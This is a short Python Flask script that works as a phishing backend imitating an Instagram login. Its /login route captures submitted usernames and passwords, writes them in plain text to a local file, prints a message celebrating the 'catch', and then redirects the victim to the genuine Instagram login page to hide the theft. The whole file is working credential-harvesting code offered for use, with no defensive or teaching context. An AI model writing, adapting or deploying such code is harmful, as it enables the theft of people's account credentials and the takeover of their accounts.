from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    with open('login_data.txt', 'a') as f:
        f.write(f"Username: {username}, Password: {password}\n")

    print(f"[!] catch data sucessfully -> username: {username} | password: {password}")

    return redirect("https://www.instagram.com/accounts/login/")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

